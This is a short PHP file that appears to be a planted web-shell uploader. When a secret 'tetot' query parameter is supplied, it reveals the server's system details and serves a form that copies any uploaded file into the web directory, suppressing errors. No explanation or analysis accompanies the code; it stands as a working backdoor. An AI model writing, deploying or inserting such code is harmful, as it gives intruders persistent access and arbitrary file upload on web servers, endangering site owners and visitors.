<?php 
if(isset($_GET["tetot"]))
{
echo"<font color=red>[uname]".php_uname()."[/uname]";
echo"<form method=post enctype=multipart/form-data>";
echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";
if($_POST["v"]==up)
{
if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]))
{
echo"<b>+</b>".$_FILES["f"]["name"];
}else
{
echo"<b>-</b>";
}
}
}
?>